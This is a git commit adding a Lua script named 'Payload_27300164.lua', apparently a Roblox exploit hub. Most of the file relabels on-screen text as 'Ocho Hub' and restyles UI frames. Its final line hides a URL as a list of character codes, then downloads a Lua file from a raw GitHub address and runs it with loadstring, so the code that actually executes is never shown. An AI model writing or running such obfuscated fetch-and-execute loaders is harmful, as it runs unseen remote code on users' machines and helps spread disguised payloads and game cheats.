7f6b3b1dfe3b094b789c7d70496aa38e15e926d8
nonamemansd <107858894+nonamemansd@users.noreply.github.com>
2026-02-08 16:44:01 +0200

    Upload Payload_27300164.lua

---
+++ Payload_27300164.lua
@@ -0,0 +1,35 @@
+
+--[[ STAGE 2: VISUAL CORE ]]
+local HubName = "Ocho Hub"
+local Acc = Color3.fromRGB(0, 255, 120)
+
+-- // SMART HOOK //
+local function Hook()
+    local function Customize(obj)
+        pcall(function()
+            if obj:IsA("TextLabel") then
+                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
+                    if #obj.Text > 3 and not tonumber(obj.Text) then
+                        obj.Text = HubName
+                        obj.TextColor3 = Acc
+                    end
+                end
+            end
+            if obj:IsA("Frame") or obj:IsA("TextButton") then
+                if obj.BackgroundColor3.R < 0.2 then
+                    if not obj:FindFirstChild("UICorner") then
+                        local uic = Instance.new("UICorner")
+                        uic.CornerRadius = UDim.new(0, 6)
+                        uic.Parent = obj
+                    end
+                end
+            end
+        end)
+    end
+    game.DescendantAdded:Connect(function(c)
+        if c:IsA("GuiObject") then task.delay(0.1, function() Customize(c) end) end
+    end)
+end
+
+Hook()
+loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 98, 101, 108, 107, 97, 104, 111, 110, 101, 121, 47, 82, 73, 86, 65, 76, 83, 47, 109, 97, 105, 110, 47, 82, 73, 86, 65, 76, 83, 46, 108, 117, 97)))()
